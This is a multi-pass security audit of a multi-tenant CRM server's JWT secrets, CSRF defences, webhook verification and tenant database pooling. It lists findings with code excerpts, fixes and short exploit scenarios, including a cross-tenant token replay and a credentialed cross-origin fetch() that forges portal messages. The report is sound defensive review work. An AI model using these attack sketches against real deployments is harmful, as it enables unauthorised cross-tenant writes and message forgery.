**File:** `/Users/serega/BizarreCRM/packages/server/src/routes/auth.routes.ts` lines 144–148  
**Code:**
```ts
const key = crypto.createHash('sha256').update(config.jwtSecret).digest();
```
The v0 TOTP decryption path (no version prefix in ciphertext) re-derives the AES-256-GCM key as a raw SHA-256 of `config.jwtSecret`. This means:
1. A JWT secret leak also leaks the TOTP AES key for any user whose `totp_secret` was encrypted with the v0 scheme.
2. The derivation uses no salt, info, or HKDF expand — just `SHA-256(secret)` — which is weak key derivation for a symmetric encryption key.

v0 is legacy-read-only path (all new encryptions use v3 / HKDF). Risk is confined to accounts that haven't re-authenticated since before v1 was introduced. The v3 path (HKDF with salt and info) correctly addresses this.

**Recommendation:** Add a migration: on next TOTP verify success, re-encrypt any v0 ciphertext with v3. Once no v0 rows remain in DB, remove the v0 branch.

---

### F-S06-05 — INFO — All tenant tokens share a single `accessJwtSecret` / `refreshJwtSecret` — cross-tenant replay mitigated by claim assertion, not key isolation

**Files:** `config.ts`, `auth.routes.ts`, `middleware/auth.ts`  
**Description:**  
In multi-tenant mode, all tenants use the same `accessJwtSecret` and `refreshJwtSecret`. A refresh token for `tenant-a` is cryptographically valid on `tenant-b`'s endpoint. The code mitigates this correctly:
- Access tokens embed `tenantSlug` and the middleware asserts `payload.tenantSlug === req.tenantSlug`.
- Refresh tokens assert `payload.tenantSlug` via `crypto.timingSafeEqual` before issuing a new token.

This is a known architectural trade-off (per-tenant keys would require key-per-row in DB or per-tenant key derivation). The existing claim-level enforcement is adequate as long as those checks are always reached. No bypass was found.

**Recommendation:** Document in `jwtSecrets.ts` or the operator guide that cross-tenant isolation relies on claim assertion, not cryptographic key isolation, so future developers don't remove those checks assuming the key provides the isolation.

---

## NOT FOUND (explicitly checked, clean)

| Check | Result |
|---|---|
| `jwt.decode` used without `verify` | Not present anywhere in `packages/server/src/` |
| `alg:none` or algorithm not pinned | All `jwt.verify` calls pass explicit `algorithms: ['HS256']` |
| Issuer / audience not asserted | All tenant + super-admin verify calls assert `issuer` and `audience`. Vonage webhook intentionally omits iss/aud (Vonage's JWT format uses `payload_hash` binding instead) |
| Weak/placeholder secret reaching production | `config.ts` calls `process.exit(1)` in `NODE_ENV=production` if secret is absent or in `INSECURE_SECRETS` list |
| Secret printed in logs | No `console.log(secret/token)` patterns found |
| Secret committed to repo | No `.env` files (non-example) tracked in git; `.env` in `.gitignore` |
| Tenant tokens signed with same key as master/super-admin tokens | `superAdminSecret` is always a distinct env var or SHA-256-derived fallback; separate audience enforces separation |
| Role claim trusted from JWT payload for authorization | `auth.ts` middleware re-reads `role` from the `users` DB table; `payload.role` in the access token is embedded for informational use only. Super-admin verify explicitly re-checks `payload.role === 'super_admin'` after verify as a guard |
| Secret length < 32 bytes in production | Both `jwtSecret` and `superAdminSecret` enforce `length >= 32` or `exit(1)` in production |
| Key rotation strategy missing | `verifyJwtWithRotation()` + `JWT_SECRET_PREVIOUS` / `JWT_REFRESH_SECRET_PREVIOUS` + operator guide procedure present |
| HS256 with kid rotation absent | No asymmetric key / JWKS endpoint expected; HS256 with secret rotation is documented and mitigated |

---

## Summary

| ID | SEV | Title |
|---|---|---|
| F-S06-01 | MEDIUM | `JWT_SECRET` in `.env.example` is an active (uncommented) weak placeholder |
| F-S06-02 | MEDIUM | `/admin-uploads` JWT handler skips session revocation check |
| F-S06-03 | LOW | `admin.routes.ts` `adminAuth` silently skips revocation checks when `masterDb` is null |
| F-S06-04 | LOW | Legacy v0 TOTP key is `sha256(jwtSecret)` — no migration to retire it |
| F-S06-05 | INFO | Cross-tenant isolation is claim-based, not key-based (documented trade-off) |

---

## PASS 2 — DEEP DIVE

### MEDIUM — Photo-upload scoped token cross-tenant replay in multi-tenant mode

**Where:** `packages/server/src/routes/tickets.routes.ts:2440` (sign), `packages/server/src/routes/tickets.routes.ts:2479` (verify)

**What:**
The photo-upload scoped JWT (minted by `POST /:id/devices/:deviceId/photo-upload-token`) embeds `ticket_id` and `ticket_device_id` but **no `tenantSlug` claim**. All tenants share the same `config.accessJwtSecret`, so the token is cryptographically valid on every tenant's subdomain. At photo-upload time (`POST /:id/photos`), the scoped-token path bypasses `authMiddleware` entirely — the only checks are `scoped.ticket_id !== ticketId` and `scoped.ticket_device_id !== bodyDeviceId`, which compare against the **target tenant's DB**. Since every tenant DB uses auto-increment integer IDs starting from 1, ticket IDs and device IDs collide across tenants.

**Code:**
```typescript
// Sign (tickets.routes.ts:2440-2451) — no tenantSlug embedded
const token = jwt.sign(
  { sub: 'photo-upload', ticket_id: ticketId, ticket_device_id: deviceId },
  config.accessJwtSecret,
  { ...JWT_SIGN_OPTIONS, audience: 'photo-upload', expiresIn: '30m' },
);

// Verify (tickets.routes.ts:2479-2483) — no tenantSlug claim checked
scopedPayload = jwt.verify(raw, config.accessJwtSecret, {
  algorithms: ['HS256'],
  issuer: JWT_SIGN_OPTIONS.issuer,
  audience: 'photo-upload',
}) as { sub?: string; ticket_id?: number; ticket_device_id?: number };
```

**Exploit:**
A user at `tenant-a.crm.example.com` with `tickets.edit` permission mints a photo-upload token for ticket 5, device 3 (their tenant). They POST that token to `tenant-b.crm.example.com/api/v1/tickets/5/photos` with `ticket_device_id=3`. If tenant-b has a ticket 5 and device 3 (nearly certain for active tenants with many tickets), the checks pass and arbitrary files are uploaded to tenant-b's ticket — a cross-tenant write via a signed token with no tenant binding.

**Fix:**
Embed `tenantSlug` in the photo-upload token payload at sign time and assert it equals `(req as any).tenantSlug` in the scoped-token branch of the photo-upload middleware, mirroring the check already done for regular access tokens in `authMiddleware`.

---

### LOW — `management.routes.ts` `managementAuth` also silently skips revocation when `masterDb` is null

**Where:** `packages/server/src/routes/management.routes.ts:269–291`

**What:**
`managementAuth()` wraps its session-expiry and account-active checks inside `if (masterDb) { ... }`. If `getMasterDb()` returns `null`, both checks are skipped and any valid (even revoked) super-admin JWT is accepted. This is the same pattern as the already-filed F-S06-03 for `admin.routes.ts`, but Pass 1 did not cite `management.routes.ts`. The route is additionally guarded by `managementApiGuard` (which itself aborts on `!masterDb`), so in practice a null master DB would be caught one layer earlier — but that guard is before `router.use(managementAuth)`, not inside it, so if `masterDb` becomes null after the guard fires, the revocation gap is reachable.

**Code:**
```typescript
const masterDb = getMasterDb();
if (masterDb) {                          // skipped if masterDb is null
  if (payload.sessionId) { /* session expiry check */ }
  if (payload.superAdminId) { /* is_active check */ }
}
next();                                  // always reached if role === 'super_admin'
```

**Exploit:**
Same as F-S06-03: if the master DB connection is transiently null (startup race, connection failure), a super-admin with a revoked JWT (logged out, account disabled) can access `GET /api/v1/management/*` endpoints.

**Fix:**
Fail closed: if `masterDb` is null, return 503 immediately before the JWT verify, the same way `managementApiGuard` does (line 113–116).

---

### LOW — Session ownership not cross-checked in `management.routes.ts` and `admin.routes.ts`

**Where:** `packages/server/src/routes/management.routes.ts:273–275`, `packages/server/src/routes/admin.routes.ts:152–154`

**What:**
Both `managementAuth` (management.routes.ts) and `adminAuth` (admin.routes.ts) verify that a session row with `payload.sessionId` exists but do **not** assert `super_admin_id = payload.superAdminId`. By contrast, `superAdminAuth` in `super-admin.routes.ts:256` correctly includes `AND super_admin_id = ?`. If an attacker held a validly-signed JWT with admin-A's `superAdminId` but another admin's `sessionId`, the session check would pass in these two middlewares even though the session does not belong to admin-A.

**Code:**
```typescript
// management.routes.ts:273 — missing super_admin_id bind
const session = masterDb.prepare(
  "SELECT id FROM super_admin_sessions WHERE id = ? AND expires_at > datetime('now')"
).get(payload.sessionId);  // no AND super_admin_id = payload.superAdminId

// super-admin.routes.ts:255 — correct
"SELECT id FROM super_admin_sessions WHERE id = ? AND super_admin_id = ? AND expires_at > datetime('now')"
```

**Exploit:**
Requires an attacker to already hold a validly-signed (with `superAdminSecret`) JWT whose `sessionId` belongs to a different admin's session — only achievable with the server's secret or a server-side bug. Real-world blast radius is negligible without that precondition, but the session check provides no defence against a token that inadvertently carries a mismatched `sessionId`.

**Fix:**
Add `AND super_admin_id = ?` with `payload.superAdminId` as the second bind parameter to the session query in both `managementAuth` and `adminAuth`, matching the pattern already used in `superAdminAuth`.

---

### INFO — `masterAuth.ts` exports unused middleware with unreachable audience

**Where:** `packages/server/src/middleware/masterAuth.ts`

**What:**
`masterAuthMiddleware` is exported but never imported anywhere in the codebase. Its `MASTER_JWT_VERIFY_OPTIONS` pins `audience: 'bizarre-crm-master'`, yet no `jwt.sign` call in the codebase ever produces a token with that audience. The file is dead code. It does not create a security hole (the middleware can't be reached), but it suggests an incomplete refactor — if it were ever wired up without a matching sign path it would reject every token with an audience mismatch.

**Code:**
```typescript
// masterAuth.ts — exported, zero import sites across entire packages/server/src/
export function masterAuthMiddleware(req, res, next): void { ... }
// audience: 'bizarre-crm-master' — no jwt.sign ever produces this audience
```

**Exploit:**
No direct exploit. If a future developer wires up the middleware without adding a sign path, all requests to those routes will 401 unconditionally.

**Fix:**
Either delete `masterAuth.ts` (if the master-panel route concept is superseded by the super-admin JWT flow) or document its intended use and add a matching `jwt.sign` call.

---

### INFO — SEC-H103 transition fallback permanently accepts `JWT_SECRET` as verify key even after full migration

**Where:** `packages/server/src/utils/jwtSecrets.ts:88–106`

**What:**
`verifyJwtWithRotation` computes `transitionSecret = rawJwtSecret !== current ? rawJwtSecret : undefined`. When `ACCESS_JWT_SECRET` is set to a dedicated value, `current = ACCESS_JWT_SECRET` and `rawJwtSecret = JWT_SECRET` — the two differ, so `transitionSecret = JWT_SECRET` is **always active** as a third fallback verify key. The boot warning (`warnIfPreviousSecretsSet`) only fires when `ACCESS_JWT_SECRET` is **absent**, so after a complete SEC-H103 migration (all dedicated secrets set), the warning stops but the `JWT_SECRET` fallback silently remains. An operator who rotates `ACCESS_JWT_SECRET` after a suspected leak but does not also rotate `JWT_SECRET` (and does not manually remove the fallback code) has not fully closed the token-forgery window.

**Code:**
```typescript
// jwtSecrets.ts:88-91
const rawJwtSecret = purpose === 'access' ? config.jwtSecret : config.jwtRefreshSecret;
const transitionSecret = rawJwtSecret !== current ? rawJwtSecret : undefined;
// transitionSecret = JWT_SECRET whenever ACCESS_JWT_SECRET is set (always differs)
// Boot warning does NOT fire when ACCESS_JWT_SECRET is set — fallback is silent.
```

**Exploit:**
If `JWT_SECRET` is leaked but `ACCESS_JWT_SECRET` is not, an attacker can forge access tokens verifiable against the `JWT_SECRET` fallback path even if the operator believes `ACCESS_JWT_SECRET` is the only active signing key.

**Fix:**
Add a date/version gate so the transition fallback path auto-disables after the maximum refresh-token lifetime (90 days) from the deployment that introduced `ACCESS_JWT_SECRET`, or add an explicit env var `JWT_SECRET_TRANSITION_DISABLED=true` that operators can set once the migration window closes, and emit a production warning until it is set.

---

### INFO — `DEVICE_TRUST_SECRET` not documented in `.env.example` and not production-fatal

**Where:** `packages/server/src/routes/auth.routes.ts:59–63`

**What:**
`DEVICE_TRUST_SECRET` is read directly from `process.env` inside `auth.routes.ts` (not wired through `config.ts`) with a fallback to `config.jwtSecret`. It is not listed in `.env.example`, so operators have no guidance to set it. Without it, device-trust cookies are keyed from `JWT_SECRET` (via HMAC), tying the 90-day device-trust cookie key material to the JWT signing root — the same cross-purpose coupling that prompted the SEC-H103 multi-key split. A `JWT_SECRET` rotation also silently invalidates all device-trust cookies without warning.

**Code:**
```typescript
// auth.routes.ts:59-63
const _deviceTrustBase = process.env.DEVICE_TRUST_SECRET || config.jwtSecret;
if (!process.env.DEVICE_TRUST_SECRET) {
  logger.warn('DEVICE_TRUST_SECRET not set; device-trust cookies share key material with JWT ...');
}
const deviceTrustKey = crypto.createHmac('sha256', _deviceTrustBase).update('device-trust-v1').digest('hex');
```

**Exploit:**
No standalone exploit path. If `JWT_SECRET` is leaked, an attacker who can observe a device-trust cookie (XSS, MITM) can correlate or forge it — though the forged cookie also requires passing `payload.type === 'device_trust'` and a fingerprint check.

**Fix:**
Add `DEVICE_TRUST_SECRET` to `.env.example` (commented, with generation command) and to `config.ts` with the same production-fatal or at minimum production-warn guard used for `ACCESS_JWT_SECRET`.

---

## Pass 2 Summary

| ID | SEV | Title |
|---|---|---|
| F-S06-06 | MEDIUM | Photo-upload scoped token has no tenant binding — cross-tenant replay in multi-tenant mode |
| F-S06-07 | LOW | `management.routes.ts` `managementAuth` silently skips revocation when `masterDb` is null |
| F-S06-08 | LOW | Session ownership not cross-checked (no `super_admin_id` bind) in `managementAuth` and `adminAuth` |
| F-S06-09 | INFO | `masterAuth.ts` exports unused middleware with unreachable `bizarre-crm-master` audience |
| F-S06-10 | INFO | SEC-H103 transition fallback (`JWT_SECRET`) silently permanent after full migration |
| F-S06-11 | INFO | `DEVICE_TRUST_SECRET` undocumented in `.env.example`; falls back to `JWT_SECRET` without prod enforcement |


---

# S07-csrf

# S07 — CSRF Protection Security Findings

Scope: `packages/server/src/utils/csrf.ts`, `packages/server/src/index.ts` (middleware order), all cookie-auth routes, Stripe/Twilio webhook endpoints
Reviewed: 2026-05-05

---

### [MEDIUM] portal-enrich v2 state-changing routes accept cookie auth but have NO CSRF protection

- Files:
  - `packages/server/src/routes/portal-enrich.routes.ts` — `DELETE /ticket/:id/photos` (line 493), `POST /ticket/:id/review` (line 704), `POST /customer/:id/referral-code` (line 861)
  - `packages/server/src/index.ts:1618` — mounted at `/portal/api/v2`
- Description: The `portalAuth` middleware in `portal-enrich.routes.ts` (line 72) accepts the portal session token from either `Authorization: Bearer` or the `portalToken` cookie. The `portalToken` is an auto-sent cookie (it is cleared with `res.clearCookie('portalToken')` in `portal.routes.ts:145`, implying the browser stores it). None of the three state-changing handlers in this file apply `requireCsrfToken`. The v1 portal routes (`portal.routes.ts`) correctly guard all their mutations — `POST /logout`, `POST /tickets/:id/comments`, `POST /tickets/:id/pay-link`, `POST /tickets/:id/feedback`, `POST /estimates/:id/approve` — with `requireCsrfToken`. The v2 routes were added later and missed the pattern.
- Exploit: An attacker's page can trigger `DELETE /portal/api/v2/ticket/123/photos`, `POST /portal/api/v2/ticket/123/review` (submitting a 1-star review), or `POST /portal/api/v2/customer/456/referral-code` on behalf of any authenticated portal customer who visits the attacker page, since the browser automatically sends the `portalToken` cookie and no extra header token is checked.
- Note: The global content-type guard (`index.ts:1284–1302`) blocks plain HTML `<form>` submissions (must be `application/json`), but a cross-origin `fetch` with `credentials: 'include'` and `Content-Type: application/json` can be issued from any origin — CORS is not a defence here because the portal paths are in `NO_ORIGIN_ALLOWED_PATHS` (line 1030), so they bypass the origin-enforcement middleware entirely.
- Fix: Import and apply `requireCsrfToken` from `utils/csrf.ts` to each of the three state-changing handlers in `portal-enrich.routes.ts`, in the same position as the v1 routes (after `portalAuth`, before the `asyncHandler`).

---

### [LOW] Twilio/voice webhook signature verification is conditional — missing implementation silently skips check

- Files:
  - `packages/server/src/providers/sms/types.ts:85` — `verifyWebhookSignature` is declared optional (`?`)
  - `packages/server/src/routes/voice.routes.ts:449, 506, 655, 737`
  - `packages/server/src/routes/sms.routes.ts:1123, 1503`
- Description: Every webhook handler guards with `if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req))` — the check is skipped entirely when the method is absent. The interface marks the method optional, so any SMS/voice provider that omits it (e.g. a future custom provider, or the `bizarresms` / `bandwidth` providers if they don't implement the method) will pass all inbound webhook requests without signature verification. The current Twilio provider correctly implements the check.
- Exploit: If an operator switches to or writes a provider without `verifyWebhookSignature`, any party that can POST to the public webhook URLs can inject synthetic inbound messages, manipulate call logs, or trigger status transitions without possessing a valid signature.
- Fix: Make `verifyWebhookSignature` required (not optional) in the `SmsProvider` interface, or add a `failClosed` fallback: when `provider.verifyWebhookSignature` is undefined, return 403 rather than continuing. A log-level warning already fires on failure; the fallback should be a hard reject.

---

### [LOW] CSRF cookie (auth) `csrf_token` is tied to the refresh-token lifetime, not the access-token session

- File: `packages/server/src/routes/auth.routes.ts:430–437`
- Description: The `csrf_token` cookie is only used to protect `POST /auth/refresh`. Its lifetime is set to match `refreshDays * 24 * 60 * 60 * 1000` (default 7–30 days). The token is a random 24-byte base64url value, which is secure. However: (1) on logout the `csrf_token` is cleared (line 1423) only for the current device; other concurrent sessions/tabs retain their copy. (2) `POST /auth/switch-user` rotates `csrf_token` (line 1575) but the other auth POSTs that rely on `authMiddleware` (e.g. `POST /auth/change-password`, `POST /auth/account/2fa/disable`) use JWT Bearer access tokens, not cookies — so they are correctly not vulnerable to CSRF. This is informational.
- Note: The `refreshToken` cookie and its `csrf_token` pair are `SameSite=Strict`, which is the strongest possible defence; the double-submit is a belt-and-suspenders backup. No exploitable weakness exists here, but the long-lived csrf_token is not rotated per-request; it persists across browser sessions if the user doesn't explicitly log out.

---

## NO FURTHER FINDINGS

**Items verified clean:**

- **Double-submit correctness**: `requireCsrfToken` in `csrf.ts` reads token from `req.cookies[CSRF_COOKIE_NAME]` and `req.header('x-csrf-token')`, compares with `crypto.timingSafeEqual` — correct implementation.
- **SameSite + Secure flags**: Both `portalCsrfToken` (SameSite=Strict) and `refreshToken`/`csrf_token` (SameSite=Strict) have correct attributes; `secure` is gated on `nodeEnv === 'production'` for the portal token and `req.secure || production` for auth tokens.
- **Token in URL / Referer leakage**: Tokens are returned in JSON response bodies only; the deprecated `GET /verify?token=` logs a warning but the token itself is the portal session token, not a CSRF token. No CSRF token appears in query strings or URLs.
- **Stripe webhook CSRF exemption + signature**: Mounted before global middleware at `index.ts:1215`; `webhookHandler` verifies `stripe-signature` before processing — correctly exempt and correctly verified.
- **CORS misconfiguration**: `credentials: true` is paired with explicit origin reflection (never `*`); attacker origins will not be in the allowlist; `NO_ORIGIN_ALLOWED_PATHS` exempts portal paths from the Origin-header enforcement, but that only affects origin-header gating, not CSRF — the CSRF token mechanism itself is unaffected by the origin exemption for read-only GETs.
- **GET endpoints mutating state**: No `router.get` calls were found that issue INSERT/UPDATE/DELETE in portal or auth routes (verified by grep).
- **Auth routes CSRF coverage**: The only cookie-auth endpoint for the main app session is `POST /auth/refresh`; all other auth POSTs use `authMiddleware` which requires a `Bearer` token header, making them immune to CSRF.
- **Token tied to session/user**: `generateCsrfToken()` generates 32 random bytes (portal) and `crypto.randomBytes(24).toString('base64url')` (auth). Neither is predictable from session data.

---

**Summary**: 1 MEDIUM (portal-enrich v2 mutation routes missing `requireCsrfToken`), 1 LOW (optional webhook signature verification), 1 LOW-INFO (csrf_token lifetime note).

---

## PASS 2 — DEEP DIVE

### Correction to Pass 1 MEDIUM finding — exploitability re-assessed

**Pass 1 stated** that the portal-enrich v2 mutation routes are CSRF-exploitable because `portalAuth` falls back to `req.cookies?.portalToken`. **Further investigation** shows that `portalToken` is stored exclusively in `sessionStorage` by the web client (`CustomerPortalPage.tsx:279`, `usePortalAuth.ts:77`) and sent only via `Authorization: Bearer` header — never set as a browser cookie by the server (`grep res.cookie packages/server/src/routes/portal.routes.ts` produces no portalToken setter; only `clearCookie('portalToken')` exists as defensive cleanup). The browser therefore does NOT auto-send `portalToken` on cross-site requests.

**Revised assessment**: The missing `requireCsrfToken` on the three portal-enrich v2 mutation routes (`DELETE /ticket/:id/photos`, `POST /ticket/:id/review`, `POST /customer/:id/referral-code`) represents a **latent CSRF / defense-in-depth gap** rather than an immediately exploitable vulnerability. The server code actively accepts the token from the cookie fallback path, which means if any future client change stores `portalToken` as a cookie (e.g., mobile deep-link, server-side-rendering, or Electron wrapper), all three routes become CSRF targets without any additional code change. The severity is **re-classified LOW** (latent risk), with the recommendation to add `requireCsrfToken` unchanged.

---

### [LOW] Tracking message route accepts portalToken cookie but has no CSRF check

**Where:** `packages/server/src/routes/tracking.routes.ts:589–598, 623` and `packages/server/src/index.ts:1595`

**What:**
`POST /api/v1/track/portal/:orderId/message` is the write endpoint in the public tracking surface. It calls `extractPortalSessionToken(req)` which reads the portal session token from `Authorization: Bearer` header **or** from `req.cookies?.portalToken` (lines 591–598). If a valid portal session is found via the cookie path, the endpoint skips the tracking-token requirement and the 3-per-minute rate limit, and writes a customer message without any CSRF check. The path is in `NO_ORIGIN_ALLOWED_PATHS` (`/api/v1/track` at `index.ts:1024`), so the production Origin guard is bypassed too.

**Code:**
```typescript
// tracking.routes.ts:589–598
function extractPortalSessionToken(req: Request): string | undefined {
  const authHeader = req.headers.authorization;
  if (authHeader && typeof authHeader === 'string' && authHeader.startsWith('Bearer ')) {
    const headerToken = authHeader.slice(7).trim();
    if (headerToken) return headerToken;
  }
  const cookies = (req as Request & { cookies?: Record<string, string> }).cookies;
  if (cookies && typeof cookies.portalToken === 'string' && cookies.portalToken.length > 0) {
    return cookies.portalToken; // ← cookie fallback, no CSRF guard on the route
  }
  return undefined;
}
```

**Exploit:**
Currently not exploitable because `portalToken` is stored in `sessionStorage` by the official web client, not as a browser cookie. However, if any future client (mobile app webview, electron wrapper, or SSR change) begins storing `portalToken` as a cookie, an attacker page could `fetch('/api/v1/track/portal/T-0001/message', { method:'POST', credentials:'include', body: JSON.stringify({content:'spam'}) })` and forge messages from an authenticated portal customer without knowing their token.

**Fix:**
Either (a) remove the cookie fallback from `extractPortalSessionToken` so only the `Authorization: Bearer` path is accepted (eliminating the CSRF surface entirely), or (b) add `requireCsrfToken` as middleware on this route, consistent with the `POST /portal/:id/comments` pattern in `portal.routes.ts:1221`.

---

### [INFO] `voiceInstructionsHandler` (GET) has no authentication and leaks store phone number

**Where:** `packages/server/src/routes/voice.routes.ts:694–720` and `packages/server/src/index.ts:1562`

**What:**
`GET /api/v1/voice/instructions/:action` is mounted with only `webhookRateLimit` middleware (60 req/min per IP). There is no authentication and no signature check. The handler reads `store_phone` from `store_config` and embeds it in the returned TwiML/NCCO/BXML response. Any unauthenticated caller can enumerate the store phone number by hitting this endpoint, and can observe what provider-specific call instructions are generated for any `to` phone number. The `to` parameter is escaped via `escapeXml` so TwiML injection is prevented, but the response reveals the store's internal telephony configuration.

**Code:**
```typescript
// voice.routes.ts:694–698,712
export async function voiceInstructionsHandler(req: Request, res: Response): Promise<void> {
  const action = (req.params.action as string) || 'connect';
  const to = (req.query.to as string) || '';
  // ...
  const instructions = provider.generateCallInstructions(action, { to, from: storePhone, announceRecording });
  // storePhone included in TwiML response body — readable by any caller
```

**Exploit:**
An external attacker can call `GET /api/v1/voice/instructions/connect?to=+1555...` to discover the store phone number and confirm the telephony provider in use, aiding targeted social engineering or provider-specific attacks. Not a direct CSRF or code-execution risk; this is an information disclosure.

**Fix:**
Add `authMiddleware` to the `voiceInstructionsHandler` mount in `index.ts:1562`, or add a shared secret/HMAC check (similar to the recording signed-URL pattern at `voice.routes.ts:256–281`) so only the telephony provider can call this endpoint. The Twilio webhook URL for `<Record>` and `<Dial>` callbacks can use the same HMAC pattern.

---

### [INFO] `http://localhost` is unconditionally in the CORS allow-list including production

**Where:** `packages/server/src/index.ts:1003–1004`

**What:**
`rawAllowedOrigins` always includes `https://localhost:${config.port}` and `http://localhost:${config.port}`, regardless of `NODE_ENV`. After `normalizeOrigin`, these become `https://localhost` and `http://localhost` (when the port is the default port), which are always in `allowedOrigins`. In production, a page served from `http://localhost` on the victim's own machine can make credentialed cross-origin requests to the API. LAN IPs (10/8, 172.16/12, etc.) are correctly DEV-only (`index.ts:1069–1073`), but localhost is not similarly guarded.

**Code:**
```typescript
// index.ts:1002–1007
const rawAllowedOrigins = [
  `https://localhost:${config.port}`,
  `http://localhost:${config.port}`,  // ← always included, even in production
  ...(process.env.ALLOWED_ORIGINS?.split(',').map(o => o.trim()).filter(Boolean) || []),
];
```

**Exploit:**
An attacker who can serve content from `http://localhost` on the victim's machine (e.g., via a local software install or malware) can make credentialed API requests to the CRM backend. The attack requires local code execution and the `refreshToken` cookie is `SameSite=Strict`, so the blast radius is limited to endpoints that use the `portalCsrfToken` cookie (which is `SameSite=Strict`) or `Authorization: Bearer`. In practice the real CSRF protections (SameSite=Strict + CSRF token) mitigate this, but the allowlist entry is unnecessary in production.

**Fix:**
Guard the localhost entries with `config.nodeEnv !== 'production'`: remove `https://localhost:${config.port}` and `http://localhost:${config.port}` from `rawAllowedOrigins` in production, or add them conditionally (`if (config.nodeEnv !== 'production')`). Operators who legitimately run the CRM on localhost in production can add it to `ALLOWED_ORIGINS`.

---

### Verified clean in Pass 2 (items not in Pass 1 scope)

- **Stripe webhook body-parser ordering**: `express.raw()` at `index.ts:1212` is before `express.json()` at `index.ts:1228`. Body-parser skips re-parsing (via `req._body` flag) so no double-parse. Correct.
- **SMS/voice rawBody for Telnyx/Vonage**: Both providers use `req.rawBody` captured by the global `express.json` `verify` callback. Both fail-closed (`return false`) when `rawBody` is absent — no silent bypass.
- **Console SMS provider in production**: `ConsoleProvider` lacks `verifyWebhookSignature` so all inbound webhook requests pass through. Impact is contained because `ConsoleProvider.parseInboundWebhook` returns `null` (no message stored). Still, a production operator using the console provider (possible: it is the default fallback) accepts all forged webhook POSTs without error, confirming the Pass 1 [LOW] finding.
- **Content-type guard `webhook`/`setup` bypass**: Only paths whose `req.path` literally contains 'webhook' or '/setup' bypass the CT guard. Express `req.path` is the path only (no query string), so `?webhook=1` does not trigger the bypass. All webhook endpoints are pre-registered and correct.
- **Token not in URLs or logs**: CSRF tokens are returned in JSON response bodies and cookies only; never in query strings, `Location` headers, or log lines.
- **GET endpoints mutating state**: `GET /portal/verify` updates `last_used_at` (acceptable side-effect on a read); no portal or enrich GET creates financial records or user-visible mutations.
- **`portalToken` never set as a server-side cookie**: Confirmed by exhaustive `grep` — `res.cookie('portalToken', ...)` does not exist in any route file. The `clearCookie('portalToken')` at `portal.routes.ts:145` is defensive cleanup. Cookie-fallback path in `portalAuth` is dead code under the current web client.
- **Cookie SameSite/Secure audit**: All server-issued cookies (`refreshToken`, `csrf_token`, `deviceTrust`, `portalCsrfToken`) are `SameSite=Strict`; `Secure` flag is `true` in production for all of them. No `SameSite=None` or missing `SameSite`.
- **CORS reflect-origin**: `cors()` uses an explicit allowlist checked by `isCorsOriginAllowed()`; it never echoes arbitrary origins. `credentials: true` is safe because the reflected origin is always from the allowlist, never `*`.
- **Double-submit constant-time comparison**: `safeEquals()` in `csrf.ts:52–60` uses `crypto.timingSafeEqual` with a length check. Empty strings are caught by the `if (!cookieToken || !headerToken)` guard before reaching `safeEquals`. No timing oracle.

---

**Updated Summary**: Pass 1 MEDIUM re-classified to LOW (latent risk — portalToken is sessionStorage not cookie). 2 new INFO findings (voiceInstructions no auth, localhost in prod CORS). 1 new LOW (tracking message route latent CSRF). Confirmed: 5 low/info-level issues total, 0 critical/high. No new MEDIUM or above.


---

# S08-tenant-isolation

# S08 — Multi-Tenant Isolation

## Findings

---

### [MEDIUM] Tenant DB refcount leaked on every normal HTTP request — pool slowly exhausts

- File: `packages/server/src/middleware/tenantResolver.ts:511` / `packages/server/src/db/tenant-pool.ts:159`
- Description: `tenantResolver` calls `getTenantDb(tenant.slug)` which increments the entry's `refcount` to signal the handle is in use. The pool documentation explicitly states _"Callers MUST call `releaseTenantDb(slug)` when the request/operation finishes"_. However, no `res.on('finish', ...)` hook is registered to call `releaseTenantDb` at the end of each HTTP request. `releaseTenantDb` is only called in a handful of specific background paths (cron, super-admin tenant routes, WebSocket handlers). Every normal API request therefore leaks one refcount increment per tenant.
- Impact: Refcounts never reach 0 for handles that served at least one request, making them permanently ineligible for LRU eviction (`evictLRU` skips all entries with `refcount > 0`). Over time — particularly under sustained traffic or when many tenants are accessed — the pool grows beyond `MAX_POOL_SIZE`, the overflow path fires (`pool.size > MAX_POOL_SIZE` → `evict-on-release`), but `releaseTenantDb` is never called so the overflow handle is also never closed. The effective result is an unlimited handle accumulation, each holding a 16 MiB page cache, eventually exhausting process memory. It also means the `getPoolStats()` `inUse` counter always reports the entire pool as in-use, making the monitoring surface misleading.
- Exploit: Not directly exploitable for cross-tenant data access, but a DoS: an attacker (or normal traffic spike) accessing many different tenant subdomains will cause unbounded file handle and memory growth, leading to OOM or EMFILE.
- Fix: Register a `res.on('finish', () => releaseTenantDb(tenant.slug))` call inside `tenantResolver` immediately after the successful `getTenantDb` call. Wrap in a try/catch so a double-release does not surface to the user.

---

### [LOW] `asyncDb` path in `tenantResolver` bypasses `tenant-pool`'s path-traversal check

- File: `packages/server/src/middleware/tenantResolver.ts:513`
- Description: `req.db` is set via `getTenantDb(tenant.slug)`, which calls `openDb()` in `tenant-pool.ts` — `openDb` validates the slug regex and asserts `path.resolve(dbPath).startsWith(path.resolve(config.tenantDataDir))`. However, `req.asyncDb` is set by constructing the DB path inline:
  ```ts
  const tenantDbPath = path.join(
    config.tenantDataDir || path.join(path.dirname(config.dbPath), 'tenants'),
    `${tenant.slug}.db`
  );
  req.asyncDb = createAsyncDb(tenantDbPath);
  ```
  This path is built from `tenant.slug` (which came from the master DB, so the slug is already trusted) but the `|| path.join(path.dirname(config.dbPath), 'tenants')` fallback is a different base than `config.tenantDataDir` used in `tenant-pool.ts`. If `config.tenantDataDir` is falsy (empty string, undefined in some edge deployment), `req.asyncDb` would point to a different directory tree than `req.db`. In practice `config.tenantDataDir` is hardcoded in `config.ts`, but the dual-path logic is a latent inconsistency — the two DB handles for the same request could theoretically diverge.
- Exploit: In a misconfigured deployment where `TENANT_DATA_DIR` env is explicitly set to empty/unset, the fallback path is used for `asyncDb` but the pool uses the hardcoded config default for `req.db`. Queries on `asyncDb` would target a different SQLite file than `req.db`, mixing data from two separate directory trees.
- Fix: Remove the fallback `||` branch; always derive both `req.db` and `req.asyncDb` from the same `config.tenantDataDir`. Alternatively, read the path from the open `req.db` handle's filename property rather than reconstructing it from slug.

---

### [INFO] Invoice and customer routes query by primary key only — implicit tenant scope via per-tenant SQLite

- Files: `packages/server/src/routes/invoices.routes.ts:626,734,991`, `packages/server/src/routes/customers.routes.ts:1309`
